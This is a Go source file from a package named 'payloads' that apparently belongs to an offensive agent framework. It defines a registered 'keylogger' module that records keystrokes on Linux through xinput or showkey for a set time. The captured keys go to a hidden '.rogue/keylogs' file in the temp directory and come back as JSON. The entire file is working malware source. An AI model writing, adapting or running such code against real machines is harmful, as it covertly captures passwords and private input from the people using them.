package payloads

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	Register(&Keylogger{})
}

type Keylogger struct{}

func (k *Keylogger) Name() string     { return "keylogger" }
func (k *Keylogger) Category() string { return "collection" }
func (k *Keylogger) Description() string {
	return "Log keystrokes using platform-specific APIs (Linux /dev/input or xinput/test)"
}

func (k *Keylogger) Execute(args map[string]string) ([]byte, error) {
	duration := args["duration"]
	if duration == "" {
		duration = "30"
	}
	sec := 30
	fmt.Sscanf(duration, "%d", &sec)

	result := k.captureKeys(sec)
	return MarshalJSON(result)
}

type keylogResult struct {
	Timestamp string   `json:"timestamp"`
	Method    string   `json:"method"`
	Captured  int      `json:"captured_keys"`
	Entries   []string `json:"entries"`
	OutputDir string   `json:"output_dir"`
	Error     string   `json:"error,omitempty"`
}

func (k *Keylogger) captureKeys(durationSec int) *keylogResult {
	r := &keylogResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Method:    "xinput/test",
	}

	var entries []string

	// Method 1: xinput test (X11)
	if xinput, err := exec.LookPath("xinput"); err == nil {
		listOut, err := exec.Command(xinput, "list", "--name-only").Output()
		if err == nil {
			lines := strings.Split(string(listOut), "\n")
			var kbDevice string
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if strings.Contains(strings.ToLower(line), "keyboard") ||
					strings.Contains(strings.ToLower(line), "at translated set") {
					kbDevice = line
					break
				}
			}

			if kbDevice != "" {
				r.Method = "xinput/" + kbDevice
				ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)

				cmd := exec.CommandContext(ctx, xinput, "test", "-key", kbDevice)
				out, _ := cmd.CombinedOutput()
				cancel()
				if len(out) > 0 {
					lineEntries := strings.Split(string(out), "\n")
					for _, l := range lineEntries {
						if strings.TrimSpace(l) != "" {
							entries = append(entries, l)
							if len(entries) >= 100 {
								break
							}
						}
					}
				} else {
					// Fallback to xinput test-xi2
					ctx2, cancel2 := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)

					cmd2 := exec.CommandContext(ctx2, xinput, "test-xi2", "--root")
					out2, _ := cmd2.CombinedOutput()
					cancel2()
					lineEntries2 := strings.Split(string(out2), "\n")
					for _, l := range lineEntries2 {
						if strings.Contains(l, "KeyPress") || strings.Contains(l, "RawKeyPress") {
							entries = append(entries, l)
							if len(entries) >= 100 {
								break
							}
						}
					}
				}
			}
		}
	}

	// Method 2: showkey (console)
	if len(entries) == 0 {
		if showkey, err := exec.LookPath("showkey"); err == nil {
			ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durationSec)*time.Second)

			cmd := exec.CommandContext(ctx, showkey, "-s")
			out, _ := cmd.CombinedOutput()
			cancel()
			if len(out) > 0 {
				r.Method = "showkey"
				lines := strings.Split(string(out), "\n")
				for _, l := range lines {
					if strings.TrimSpace(l) != "" {
						entries = append(entries, l)
						if len(entries) >= 100 {
							break
						}
					}
				}
			}
		}
	}

	r.Captured = len(entries)
	r.Entries = entries

	// Save output
	cacheDir := filepath.Join(os.TempDir(), ".rogue", "keylogs")
	os.MkdirAll(cacheDir, 0700)
	outFile := filepath.Join(cacheDir, fmt.Sprintf("keylog_%s.log",
		time.Now().Format("20060102_150405")))
	if len(entries) > 0 {
		os.WriteFile(outFile, []byte(strings.Join(entries, "\n")), 0600)
		r.OutputDir = outFile
	}

	return r
}
